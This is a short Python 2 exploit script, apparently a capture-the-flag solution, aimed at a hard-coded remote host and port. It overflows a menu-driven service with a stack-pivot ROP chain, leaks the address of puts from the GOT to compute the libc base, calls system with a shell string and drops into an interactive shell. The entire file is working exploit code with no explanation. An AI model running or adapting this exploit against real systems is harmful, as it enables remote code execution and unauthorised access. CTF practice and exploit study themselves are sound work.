#!/usr/bin/python
import struct
import socket
import telnetlib

def readuntil(f, delim=': '):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('202.112.26.106', 5149))
f = s.makefile('rw', bufsize=0)

pop_ebp_ret = 0x8048d8f
pop2_ret = 0x8048d8e
leave_ret = 0x8048A6E
puts = 0x8048510
stack_chk_fail_got = 0x804B01C
puts_got = 0x804B010
read_line = 0x80486CB
bss = 0x804B810
payload = p(leave_ret)
payload += 'H' * (0x10C / 3)
payload += 'X'
payload += p(pop_ebp_ret)
payload += p(stack_chk_fail_got)
payload += p(puts)
payload += p(pop_ebp_ret)
payload += p(puts_got)
payload += p(read_line)
payload += p(pop2_ret)
payload += p(bss)
payload += p(0x7fffffff)
payload += p(pop_ebp_ret)
payload += p(bss)
payload += p(leave_ret)

readuntil(f)
f.write('1\n')
f.write(payload + '\n')
readuntil(f)

f.write('4\n')

data = f.readline()
libc_puts = u(data[:4])
libc_base = libc_puts - 0x65650
system = libc_base + 0x40190
binsh = libc_base + 0x160A24

print 'libc_base =', hex(libc_base)

rop = 'AAAA'
rop += p(system)
rop += 'sh;#'
rop += p(bss + 8)
f.write(rop + '\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()
